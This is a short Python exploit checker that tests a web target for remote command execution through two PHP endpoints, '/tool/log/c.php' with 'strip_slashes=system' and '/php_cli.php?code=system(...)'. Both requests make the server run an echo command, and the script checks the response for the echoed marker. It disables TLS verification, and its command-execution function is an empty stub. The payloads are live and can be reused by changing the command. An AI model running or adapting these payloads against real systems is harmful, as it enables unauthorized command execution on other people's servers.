# -*- coding: utf-8 -*-
#author: cwbird
import re
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp_check(url):
    payload1 = "/tool/log/c.php?strip_slashes=system&host="+"echo 7969676569776f6c696769616f"
    payload2 = "/php_cli.php?code=system('echo 7969676569776f6c696769616f');"
    try:
        r1 = requests.get(url+payload1,verify= False,timeout=5)
        r2 = requests.get(url+payload2,verify= False,timeout=5)
        if (r"7969676569776f6c696769616f" in r1.text) or (r"7969676569776f6c696769616f" in r2.text):
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    pass